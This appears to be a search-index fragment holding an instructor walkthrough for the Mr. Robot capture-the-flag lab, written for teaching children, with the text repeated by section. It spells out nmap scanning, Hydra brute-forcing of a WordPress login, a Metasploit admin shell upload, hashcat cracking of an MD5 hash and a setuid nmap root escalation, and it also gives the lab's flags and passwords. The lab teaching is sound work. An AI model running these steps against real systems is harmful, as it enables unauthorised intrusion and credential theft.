IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.","title":"License"},{"location":"walkthrough/","text":"Instructor Mr. Robot Walkthrough General guidance: Pay attention to the IP address- the VM may have a different IP address- if the kids copy insert their material Many command flags are case sensitive. Pay attention to the case of command flags Be sure to ask the kids if they want to take a break after finding a flag. Going through all 3 may be too advanced for many of the kids. First Flag Students should first use ip to see their network details, then they should use nmap to find what hosts sit on the network. They should see one of the hosts has ports 80 and 443 open, indicating it\u2019s probably hosting a web application. They should navigate to this ip address in a browser. They should execute: Go to a Kali terminal ip addr show eth0 nmap -n 10.13.13.0/24 The first flag can be found by navigating to the robots.txt for the site in the browser. From there, students should see there is a file called key-1-of-3.txt they can navigate to. In addition, there will be an fsociety.dic file, they should download that now. The process for getting there is: /robots.txt /key-1-of-3.txt Second Flag The second flag is a little trickier and will take a bit more time. First, students should try to navigate to a page that doesn\u2019t exist. This should generate a 404 page; this will reveal that the site is powered via wordpress. One of the features of wordpress is the ability to login as either a user or an admin. This site is found on /wp-login.php. The steps are: Navigate to / completelyfakepage Click Log in on the bottom left From here the student will need to do some password cracking to be able to login. First, they should try and login and see that the site will say if a username is correct or not. They should try elliot (name of the main character in the show) to see it\u2019ll say the password is wrong. They should open developer tools and go to the network tab while trying to login from here they should look at a sample call to see what that looks like. Open developer tools and go to network tab Login with a random username/password Try logging in with *elliot * as username This is where the fsociety.dic file comes into play. However, it contains a lot of duplicates and will slow down the cracking process, so it should be deduped first. This can be done via: sort -u fsocity.dic -o uniq.dic Go to / *foscity.dic * and download the file On the downloaded file * (in a terminal) run: * sort -u fsocity.dic * -o *uniq.dic From here, the student can run THC Hydra, a password cracking tool. Based on the knowledge they gained about the login calls and their failed attempt they should have everything they need to start the cracking a sample command is: hydra - l elliot -P uniq.dic http-post-form \u201c / wp-login.php:log =^USER^ pwd =^PASS^: F=is incorrect \u201d which will take significantly less time. Finally, the correct login is: user: elliot, pass: ER28-0652. The process is as follows: Go to a Kali terminal hydra -l elliot -P uniq.dic web app ip address http-post-form \u201c/wp-login.php:log=^USER^ pwd=^PASS^:F=is incorrect\u201d Students are going to probably want to play around on the admin site for a while. Ultimately they\u2019ll realize the second key isn\u2019t on the web app. You should point out they likely need to get access onto the box to do that. Thankfully WordPress has a long history of vulnerabilities! Specifically one for performing reverse shell uploads. Metasploit is just the tool to do that for them. Do make sure to talk about what Metasploit is and what makes it so useful. The process is as follows: Go to a Kali terminal Run *ms *f console use exploit/ *unix / *webapp / wp_admin_shell_upload set USERNAME elliot set PASSWORD ER28-0652 set RHOST 10.13.13.102 set WPCHECK false exploit In *meterpreter * run shell The default meterpreter shell is kind of annoying and students won\u2019t like it. They should setup a quick python script to give them a proper shell. The steps for this is as follows: echo import pty; pty.spawn( /bin/bash ) / tmp / asdf . py python /tmp/asdf.py Students probably won\u2019t know this but /home/ is really useful for finding info about who\u2019s on the box. If they cd into the /home/ directory they should find there\u2019s a user called robot. If they cd into /home/robot/ they should see two things: the second key file and an md5 hash of robot\u2019s password. They won\u2019t be able to access the file since they\u2019re not robot. They should be able to see the hash in the password file though. The steps are as follows: cd /home/ cd robot/ cat password.raw-md5 You should let the student know that md5 is considered broken and easy to break. In addition, kali comes with a hash breaker called hashcat they can use to crack the password. Kali also comes with a wordlist they can use to brute force the password. This file is called rockyou. The steps for cracking it as follows: Copy the hash in the password.raw-md5 file Go to a Kali terminal gunzip * / usr */share/wordlists/rockyou. txt.gz echo \u201c \u201d password.md5 hashcat * --force -a 0 -m 0 password.md5 / *usr /share/wordlists/rockyou.txt -o cracked.txt cat cracked.txt Now they have the username/password for the robot user. It\u2019s robot/abcdefghijklmnopqrstuvwxyz essentially the password is all letters of the alphabet. Back on the server shell they should run su robot to login as them. Then they can access the second key. The process is as follows: su robot cat key-2-of-3.txt Third Flag Finally, they\u2019ll need to gain access to root, ideally the documentation explains what root is and why it\u2019s so important to protect, but some reminding might be necessary. What they should also know is that some programs will actually run as a different user than the person that started the program, this means that while they ran the program, the program could be running as someone entirely different. Thus, if they can trick or get that program to open a shell, then they would be able to act as root if it\u2019s set to run as root. This is where the setuid flag comes into play. They can find all programs with this flag set via: find / -perm -4000 2 /dev/null . The process is as follows: find / -perm -4000 2 /dev/null What they should find is a few programs with it set, most of them should make sense, but nmap should be strange to them. If they just run nmap with no flags, they should find it\u2019s actually a version with an interactive mode! In addition, they should run ls -l on it and see it\u2019s owned by root. Thus nmap --interactive will actually grant them a root shell, from there a simple ! sh will grant a more usable shell with which they can navigate to /root and see the final flag. The steps are as follows: ls -l / *usr */local/bin/ nmap nmap --interactive ! sh whoami cd /root/ ls cat key-3-of-3.txt","title":"Instructor Walkthrough"},{"location":"walkthrough/#instructor-mr-robot-walkthrough","text":"General guidance: Pay attention to the IP address- the VM may have a different IP address- if the kids copy insert their material Many command flags are case sensitive. Pay attention to the case of command flags Be sure to ask the kids if they want to take a break after finding a flag. Going through all 3 may be too advanced for many of the kids.","title":"Instructor Mr. Robot Walkthrough"},{"location":"walkthrough/#first-flag","text":"Students should first use ip to see their network details, then they should use nmap to find what hosts sit on the network. They should see one of the hosts has ports 80 and 443 open, indicating it\u2019s probably hosting a web application. They should navigate to this ip address in a browser. They should execute: Go to a Kali terminal ip addr show eth0 nmap -n 10.13.13.0/24 The first flag can be found by navigating to the robots.txt for the site in the browser. From there, students should see there is a file called key-1-of-3.txt they can navigate to. In addition, there will be an fsociety.dic file, they should download that now. The process for getting there is: /robots.txt /key-1-of-3.txt","title":"First Flag"},{"location":"walkthrough/#second-flag","text":"The second flag is a little trickier and will take a bit more time. First, students should try to navigate to a page that doesn\u2019t exist. This should generate a 404 page; this will reveal that the site is powered via wordpress. One of the features of wordpress is the ability to login as either a user or an admin. This site is found on /wp-login.php. The steps are: Navigate to / completelyfakepage Click Log in on the bottom left From here the student will need to do some password cracking to be able to login. First, they should try and login and see that the site will say if a username is correct or not. They should try elliot (name of the main character in the show) to see it\u2019ll say the password is wrong. They should open developer tools and go to the network tab while trying to login from here they should look at a sample call to see what that looks like. Open developer tools and go to network tab Login with a random username/password Try logging in with *elliot * as username This is where the fsociety.dic file comes into play. However, it contains a lot of duplicates and will slow down the cracking process, so it should be deduped first. This can be done via: sort -u fsocity.dic -o uniq.dic Go to / *foscity.dic * and download the file On the downloaded file * (in a terminal) run: * sort -u fsocity.dic * -o *uniq.dic From here, the student can run THC Hydra, a password cracking tool. Based on the knowledge they gained about the login calls and their failed attempt they should have everything they need to start the cracking a sample command is: hydra - l elliot -P uniq.dic http-post-form \u201c / wp-login.php:log =^USER^ pwd =^PASS^: F=is incorrect \u201d which will take significantly less time. Finally, the correct login is: user: elliot, pass: ER28-0652. The process is as follows: Go to a Kali terminal hydra -l elliot -P uniq.dic web app ip address http-post-form \u201c/wp-login.php:log=^USER^ pwd=^PASS^:F=is incorrect\u201d Students are going to probably want to play around on the admin site for a while. Ultimately they\u2019ll realize the second key isn\u2019t on the web app. You should point out they likely need to get access onto the box to do that. Thankfully WordPress has a long history of vulnerabilities! Specifically one for performing reverse shell uploads. Metasploit is just the tool to do that for them. Do make sure to talk about what Metasploit is and what makes it so useful. The process is as follows: Go to a Kali terminal Run *ms *f console use exploit/ *unix / *webapp / wp_admin_shell_upload set USERNAME elliot set PASSWORD ER28-0652 set RHOST 10.13.13.102 set WPCHECK false exploit In *meterpreter * run shell The default meterpreter shell is kind of annoying and students won\u2019t like it. They should setup a quick python script to give them a proper shell. The steps for this is as follows: echo import pty; pty.spawn( /bin/bash ) / tmp / asdf . py python /tmp/asdf.py Students probably won\u2019t know this but /home/ is really useful for finding info about who\u2019s on the box. If they cd into the /home/ directory they should find there\u2019s a user called robot. If they cd into /home/robot/ they should see two things: the second key file and an md5 hash of robot\u2019s password. They won\u2019t be able to access the file since they\u2019re not robot. They should be able to see the hash in the password file though. The steps are as follows: cd /home/ cd robot/ cat password.raw-md5 You should let the student know that md5 is considered broken and easy to break. In addition, kali comes with a hash breaker called hashcat they can use to crack the password. Kali also comes with a wordlist they can use to brute force the password. This file is called rockyou. The steps for cracking it as follows: Copy the hash in the password.raw-md5 file Go to a Kali terminal gunzip * / usr */share/wordlists/rockyou. txt.gz echo \u201c \u201d password.md5 hashcat * --force -a 0 -m 0 password.md5 / *usr /share/wordlists/rockyou.txt -o cracked.txt cat cracked.txt Now they have the username/password for the robot user. It\u2019s robot/abcdefghijklmnopqrstuvwxyz essentially the password is all letters of the alphabet. Back on the server shell they should run su robot to login as them. Then they can access the second key. The process is as follows: su robot cat key-2-of-3.txt","title":"Second Flag"},{"location":"walkthrough/#third-flag","text":"Finally, they\u2019ll need to gain access to root, ideally the documentation explains what root is and why it\u2019s so important to protect, but some reminding might be necessary. What they should also know is that some programs will actually run as a different user than the person that started the program, this means that while they ran the program, the program could be running as someone entirely different. Thus, if they can trick or get that program to open a shell, then they would be able to act as root if it\u2019s set to run as root. This is where the setuid flag comes into play. They can find all programs with this flag set via: find / -perm -4000 2 /dev/null . The process is as follows: find / -perm -4000 2 /dev/null What they should find is a few programs with it set, most of them should make sense, but nmap should be strange to them. If they just run nmap with no flags, they should find it\u2019s actually a version with an interactive mode! In addition, they should run ls -l on it and see it\u2019s owned by root. Thus nmap --interactive will actually grant them a root shell, from there a simple ! sh will grant a more usable shell with which they can navigate to /root and see the final flag. The steps are as follows: ls -l / *usr */local/bin/ nmap nmap --interactive ! sh whoami cd /root/ ls cat key-3-of-3.txt","title":"Third Flag"}]}